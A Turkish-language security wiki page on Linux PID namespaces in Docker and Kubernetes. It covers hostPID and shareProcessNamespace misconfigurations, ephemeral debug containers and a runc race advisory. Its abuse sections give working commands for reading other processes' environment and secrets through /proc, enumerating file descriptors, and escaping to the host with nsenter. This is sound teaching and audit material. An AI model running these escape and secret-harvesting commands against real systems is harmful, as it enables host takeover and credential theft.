# PID Ad Alanı

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

PID ad alanı, süreçlerin nasıl numaralandırılacağını ve hangi süreçlerin görünür olacağını denetler. Bu nedenle bir container, gerçek bir makine olmadığı hâlde kendi PID 1 sürecine sahip olabilir. Ad alanının içindeki iş yükü, yerel bir süreç ağacı gibi görünen bir yapı görür. Ad alanının dışındaysa ana makine, gerçek ana makine PID’lerini ve tüm süreç görünümünü görmeye devam eder.<sup>[[3]](#references)</sup>

Güvenlik açısından PID ad alanı önemlidir; çünkü süreçlerin görünürlüğü değerlidir. Bir iş yükü ana makine süreçlerini görebildiğinde hizmet adlarını, komut satırı bağımsız değişkenlerini, süreç bağımsız değişkenlerinde aktarılan gizli bilgileri, `/proc` üzerinden ortam değişkenlerinden türetilen durumu ve olası ad alanına giriş hedeflerini gözlemleyebilir. Bu süreçleri görmekten fazlasını yapabiliyorsa, örneğin doğru koşullarda sinyal gönderebiliyor veya ptrace kullanabiliyorsa, sorun çok daha ciddi hâle gelir.

## Çalışma Şekli

Yeni bir PID ad alanı kendi iç süreç numaralandırmasıyla başlar. Ad alanının içinde oluşturulan ilk süreç, ad alanı açısından PID 1 olur; bu da yetim çocuk süreçler ve sinyal davranışı için init benzeri özel anlamlar taşıdığı anlamına gelir. Bu durum; container’lardaki init süreçleriyle ilgili pek çok tuhaflığı, zombi süreçlerin toplanmasını ve container’larda neden bazen küçük init sarmalayıcıları kullanıldığını açıklar.<sup>[[3]](#references)</sup>

PID ad alanları hiyerarşik bir yapı oluşturur. Üst ad alanındaki bir süreç, alt ad alanlarındaki süreçlere üst ad alanında atanmış PID’leri kullanarak erişebilir; ancak alt ad alanındaki bir süreç, sıradan PID tabanlı sistem çağrılarıyla üst ad alanındaki süreçlere erişemez veya `setns()` ile üst bir PID ad alanına geçemez. Alt ad alanına bilerek sunulan, üst ad alanına ait bir procfs yine de üst ad alanının süreç görünümünü sızdırabilir. Ayrıca `setns()` ile bir PID ad alanına katılmak, çağıran süreci değil **gelecekte oluşturulacak çocuk süreçleri** etkiler; bu nedenle araçlar katıldıktan sonra fork işlemi yapar. Bir procfs mount’u, onu bağlayan sürecin PID görünümünü korur. Bu yüzden `unshare(CLONE_NEWPID)` sonrasında yeni bir procfs oluşturmak yalnızca görünüşle ilgili değil, güvenlik açısından da önemlidir.<sup>[[3]](#references)</sup>

Önemli güvenlik dersi şudur: Bir süreç yalnızca kendi PID ağacını gördüğü için yalıtılmış gibi görünebilir, ancak bu yalıtım bilerek kaldırılabilir. Docker bunu `--pid=host` ile, Kubernetes ise `hostPID: true` ile sağlar. Container ana makinenin PID ad alanına katıldığında iş yükü ana makine süreçlerini doğrudan görür ve sonraki birçok saldırı yolu çok daha gerçekçi hâle gelir.

## Laboratuvar

Manuel olarak bir PID ad alanı oluşturmak için:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Shell artık özel bir süreç görünümü görür. `--mount-proc` flag’i önemlidir; çünkü yeni PID namespace ile eşleşen bir procfs örneği bağlayarak süreç listesinin içeriden tutarlı görünmesini sağlar.<sup>[[3]](#references)</sup>

Container davranışını karşılaştırmak için:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

Fark hemen görülür ve anlaşılması kolaydır; bu nedenle okuyucular için iyi bir ilk laboratuvardır.

## Çalışma Zamanındaki Kullanım

Docker, Podman, containerd ve CRI-O'daki normal container'lar kendi PID namespace'lerini kullanır. Kubernetes container'larının PID görünümleri normalde ayrıdır; `shareProcessNamespace: true` ise kasıtlı olarak Pod genelinde tek bir görünüm oluşturur.<sup>[[4]](#references)</sup> Buna karşılık `hostPID: true`, düğümün PID namespace'ini seçer. LXC/Incus ortamları da aynı kernel ilkel öğesine dayanır; ancak sistem container'ı kullanım senaryoları daha karmaşık süreç ağaçları ortaya çıkarabilir ve daha fazla hata ayıklama kestirmesine teşvik edebilir.

Aynı kural her yerde geçerlidir: çalışma zamanı PID namespace'ini yalıtmamayı seçtiyse bu, container sınırının kasıtlı olarak zayıflatılmasıdır.

## Yanlış Yapılandırmalar

En yaygın yanlış yapılandırma, ana makinenin PID'lerinin paylaşılmasıdır. Ekipler bunu genellikle hata ayıklama, izleme veya hizmet yönetimini kolaylaştırma gerekçesiyle savunur; ancak bu durum her zaman önemli bir güvenlik istisnası olarak ele alınmalıdır. Container'ın ana makinedeki süreçler üzerinde doğrudan yazma olanağı olmasa bile, yalnızca görünürlük sistem hakkında pek çok şeyi açığa çıkarabilir. `CAP_SYS_PTRACE` gibi yetenekler veya kullanışlı procfs erişimi eklendiğinde risk önemli ölçüde artar.

Bir başka hata da iş yükünün varsayılan olarak ana makinedeki süreçleri sonlandıramadığı veya ptrace edemediği için ana makinenin PID'lerini paylaşmanın zararsız olduğunu varsaymaktır. Bu çıkarım; keşfin değerini, namespace'e giriş için hedeflerin bulunabilirliğini ve PID görünürlüğünün diğer zayıflatılmış kontrollerle birleşme biçimini göz ardı eder.

### Kubernetes Pod genelinde süreç paylaşımı

`shareProcessNamespace: true`, `hostPID`'den farklıdır: düğüm süreçlerini değil, **aynı Pod'daki diğer container'ların süreçlerini** görünür kılar. Böylece ele geçirilmiş bir sidecar veya debug container'ı, procfs erişim denetimlerine bağlı olarak kardeş container'ların komut satırlarını ve ortam verilerini keşfedebilir, kimlik bilgileri izin verdiğinde sinyal gönderebilir ve `/proc/<pid>/root` üzerinden kardeş container'ın dosya sisteminde gezinebilir. Kubernetes, komut satırı/ortam sırlarının ve container dosya sistemlerinin bu durumda yalnızca geçerli Unix izinleriyle korunduğu konusunda açıkça uyarır.<sup>[[4]](#references)</sup>

Küme tarafında yapılabilecek yararlı bir inceleme:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Pod genelindeki bir PID namespace içindeki ele geçirilmiş bir container'dan, görünürlüğün okunabilirlik anlamına geldiğini varsaymak yerine önce gerçek erişimi test edin:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Mevcut bir Kubernetes Pod'unda hedeflenen geçici container'lar

`pods/ephemeralcontainers` kaynağını değiştirme yetkisi olan bir Kubernetes kimliği, `shareProcessNamespace` ayarlanmamış olsa bile çalışan bir Pod'a hata ayıklayıcı ekleyebilir. `--target` ile, çalışma zamanı ad alanı hedeflemeyi destekliyorsa hata ayıklayıcı adı belirtilen container'ın süreç ad alanına katılır. Bu, node'un host PID ad alanına değil, söz konusu container'ın süreçlerini görme olanağı sağlar.<sup>[[5]](#references)</sup>

API ayrı bir alt kaynak kullanır; bu nedenle sıradan Pod yazma izinlerinin bu erişimi kapsadığını varsaymak yerine `patch`/`update` izinlerini inceleyin.<sup>[[6]](#references)</sup>

Yetkili bir ad alanındaki Pod ve container için hedeflenen görünümü test edin:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Runtime targeting özelliğini uygulamıyorsa debugger başlatılamayabilir veya yalıtılmış bir PID namespace içinde kalabilir.<sup>[[5]](#references)</sup> Targeting çalışıyorsa, `/proc/<pid>` erişimini test etmek için [Kubernetes Pod genelinde süreç paylaşımı](#kubernetes-pod-wide-process-sharing) bölümündeki kontrolleri kullanın. Bir sürecin görünür olması, hedefin sırlarını okuma veya ona sinyal gönderme izni vermez: Unix kimlik bilgileri ve procfs erişim kontrolleri hâlâ geçerlidir.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards, ephemeral container'lardaki ayrıcalıklı ayarları da sınırlar.<sup>[[7]](#references)</sup>

## Kötüye Kullanım

Host PID namespace'i paylaşılıyorsa, saldırgan host süreçlerini inceleyebilir, süreç argümanlarını toplayabilir, ilgi çekici servisleri belirleyebilir, `nsenter` için aday PID'leri bulabilir veya süreç görünürlüğünü ptrace ile ilgili ayrıcalıklarla birleştirerek host ya da komşu workload'lara müdahale edebilir. Bazı durumlarda, yalnızca doğru uzun süre çalışan süreci görmek bile saldırı planının geri kalanını şekillendirmeye yeter.

İlk pratik adım her zaman host süreçlerinin gerçekten görünür olduğunu doğrulamaktır:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Host PID'leri görünür hale geldiğinde, süreç argümanları ve namespace'e giriş hedefleri çoğu zaman en kullanışlı bilgi kaynağı olur:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

`nsenter` mevcutsa ve yeterli ayrıcalık varsa, görünür bir ana makine sürecinin namespace köprüsü olarak kullanılıp kullanılamayacağını test edin:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Giriş engellense bile host PID paylaşımı; servis düzenini, çalışma zamanı bileşenlerini ve sonraki aşamada hedef alınabilecek ayrıcalıklı süreçleri ortaya çıkardığı için zaten değerlidir. Yalnızca PID’leri görebilmek; sinyal gönderme, izleme, hassas `/proc/<pid>` girdilerini okuma veya hedefin diğer namespace’lerine katılma izni **vermez**. Kimlik bilgileri, dumpability, hedef namespace’i sahiplenen user namespace içindeki capabilities, Yama/LSM politikası ve seccomp hâlâ önemlidir.<sup>[[3]](#references)</sup> Süreç enjeksiyonu örnekleri için [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) sayfasına bakın.

Host PID’lerini görebilmek, file descriptor kötüye kullanımını da daha gerçekçi hâle getirir. Ayrıcalıklı bir host süreci veya komşu bir workload hassas bir dosya ya da socket açmışsa saldırgan; ptrace tarzı denetimlere, sahipliğe, procfs mount seçeneklerine, nesne türüne ve hedef servis modeline bağlı olarak `/proc/<pid>/fd/` dizinini inceleyip alttaki nesneye erişebilir. Bir FD symlink’ini görmek, onun açılabileceği anlamına gelmez; ayrıca bir socket, yalnızca `/proc/<pid>/fd/N` symlink’i açılarak kopyalanamaz. Ayrı `pidfd_getfd()` primitive’i ve yetkilendirme denetimleri için [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md) sayfasına bakın.<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Bu komutlar, `hidepid=1` veya `hidepid=2` ayarının süreçler arası görünürlüğü azaltıp azaltmadığını ve açık secret dosyaları, loglar veya Unix socket'leri gibi bariz şekilde ilgi çekici tanımlayıcıların görünür olup olmadığını anlamaya yardımcı olur.

### Tam Örnek: host PID + `nsenter`

Host PID paylaşımı, süreç host namespace'lerine katılmak ve host sürecinin root dizinini benimsemek için gerekli yeteneklere sahipse host escape'i mümkün kılabilir. İkincisi için `nsenter --root` (`-r`) gerekir: yalnızca mount namespace'ini değiştirmek, çağıranın root dizinini değiştirmez.<sup>[[9]](#references)</sup> `/proc/1/root` erişimi bir ptrace okuma denetimine tabidir; root dizinini değiştirmek ise çağıranın user namespace'inde `CAP_SYS_CHROOT` gerektirir.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Komut başarılı olursa, yeni shell host’un mount, UTS, network, IPC ve PID namespace’lerini ve PID 1’in root dosya sistemini kullanır. Yalnızca PID’lerin görünür olmasının host ayrıcalıkları sağladığını varsaymak yerine, etkin kimliği ve erişimi kontrol edin.<sup>[[9]](#references)</sup>

`nsenter` komutu eksik olsa bile, host dosya sistemi bağlıysa aynı sonuç host binary’si üzerinden elde edilebilir:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Güncel Runtime Notları

PID namespace ile ilgili bazı saldırılar, geleneksel `hostPID: true` yanlış yapılandırmaları değildir; bunun yerine, container kurulumu sırasında procfs korumalarının nasıl uygulandığıyla ilgili runtime uygulama hatalarıdır.

#### Host procfs'e giden `maskedPaths` yarışı

Savunmasız `runc` sürümlerinde, container image'ını veya `runc exec` iş yükünü kontrol edebilen saldırganlar, container tarafındaki `/dev/null` dosyasını `/proc/sys/kernel/core_pattern` gibi hassas bir procfs yoluna işaret eden symlink ile değiştirerek maskeleme aşamasında yarış durumu oluşturabilirdi. Yarış başarılı olursa, masked-path bind mount'u yanlış hedefe bağlanabilir ve yeni container'a host genelindeki procfs ayarlarını açığa çıkarabilirdi.<sup>[[1]](#references)</sup>

Yararlı inceleme komutu:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Bu önemlidir çünkü nihai etki, doğrudan procfs açığa çıkmasıyla aynı olabilir: yazılabilir `core_pattern` veya `sysrq-trigger` üzerinden ana makinede kod yürütme ya da hizmet engelleme. Burada tekrara düşmemek için genel procfs saldırı yüzeyi, özel [masked paths](../masked-paths.md) ve [sensitive host mounts](../../sensitive-host-mounts.md) sayfalarında ele alınmıştır.

#### `insject` ile Namespace injection

`insject` gibi Namespace injection araçları, PID namespace etkileşiminin süreç oluşturulmadan önce hedef namespace’e girilmesini her zaman gerektirmediğini gösterir. Bir yardımcı süreç daha sonra bağlanabilir, `setns()` kullanabilir ve hedef PID alanındaki görünürlüğü koruyarak çalışabilir:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Bu tür teknikler, özellikle namespace context'in runtime workload'u zaten başlattıktan sonra birleştirilmesi gereken gelişmiş debugging, offensive tooling ve post-exploitation iş akışlarında önemlidir.

### İlgili FD Abuse Kalıpları

Host PID'leri görünür olduğunda iki kalıbı özellikle belirtmek gerekir. İlk olarak, ayrıcalıklı bir process `O_CLOEXEC` ile işaretlenmediği için hassas bir file descriptor'ı `execve()` boyunca açık tutabilir. İkinci olarak, servisler `SCM_RIGHTS` aracılığıyla Unix socket'leri üzerinden file descriptor aktarabilir. Her iki durumda da önemli olan artık pathname değil, düşük ayrıcalıklı bir process'in devralabileceği veya alabileceği, önceden açılmış handle'dır.

Bu, container çalışmaları açısından önemlidir; çünkü handle, path'e container filesystem'inden doğrudan erişilemese bile `docker.sock`, ayrıcalıklı bir log, host'taki bir secret file veya başka bir yüksek değerli nesneyi gösterebilir.

## Kontroller

Bu komutların amacı, process'in özel bir PID görünümüne sahip olup olmadığını veya çok daha geniş bir process ortamını zaten listeleyip listeleyemediğini belirlemektir.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Burada ilginç olanlar:<sup>[[3]](#references)</sup>

- Process listesinde açıkça host'a ait servisler varsa, host PID paylaşımı muhtemelen zaten etkin durumdadır.
- Yalnızca container'a ait küçük bir ağaç görmek normal başlangıç durumudur; `systemd`, `dockerd` veya ilgisiz daemon'lar görmek normal değildir.
- `NSpid`, iç içe namespace'ler arasındaki PID eşlemesini açığa çıkarabilir. En soldaki değer, procfs mount'uyla ilişkili PID namespace'ine göredir; ardından giderek iç içe geçen namespace'lere ait değerler gelir.
- Tek başına `readlink /proc/self/ns/pid`, `hostPID` durumunu kanıtlayamaz: yalıtılmış bir container'da da geçerli bir PID namespace inode'u bulunur. Mevcut olduğunda bunu process listesi, procfs mount'u, runtime yapılandırması ve host tarafındaki namespace inode'u ile karşılaştırın.
- Host PID'leri görünür olduğunda, salt okunur process bilgileri bile keşif için işe yarar.

Host PID paylaşımıyla çalışan bir container keşfederseniz, bunu kozmetik bir farklılık olarak görmeyin. Bu, iş yükünün neleri gözlemleyebileceğini ve potansiyel olarak neleri etkileyebileceğini önemli ölçüde değiştirir.





## References

- [1] [runc güvenlik duyurusu: mount yarış koşulları nedeniyle "masked path" kötüye kullanımı yoluyla container'dan kaçış (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Araç sürümü – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 kitabı](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Pod'daki Container'lar arasında Process Namespace'i paylaşma](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Çalışan Pod'larda hata ayıklama](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [Ephemeral Containers KEP](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Pod Güvenlik Standartları](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
